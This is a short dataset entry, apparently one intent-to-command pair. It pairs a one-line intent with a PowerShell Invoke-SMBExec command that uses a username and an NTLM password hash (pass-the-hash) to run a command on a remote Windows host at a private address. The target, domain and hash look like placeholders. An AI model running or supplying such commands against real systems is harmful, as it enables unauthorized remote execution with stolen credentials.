# Natural language intent:
# Invoke SMBExec to run a command on a remote system with specified options.

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'command or launcher to execute' -verbose
